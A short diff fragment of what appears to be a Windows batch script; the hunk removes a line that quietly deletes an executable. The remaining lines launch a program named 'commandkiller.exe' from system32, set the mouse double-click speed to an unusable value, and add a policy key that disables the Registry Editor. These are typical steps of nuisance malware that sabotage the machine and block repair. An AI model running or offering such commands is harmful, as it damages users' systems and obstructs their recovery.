@@ -58,4 +58,3 @@ cd "%windir%\system32"
 start commandkiller.exe
 reg add "HKCU\Control Panel\Mouse" /v DoubleClickSpeed /t REG_SZ /d 1 /f
 reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
-del Endline.exe/q
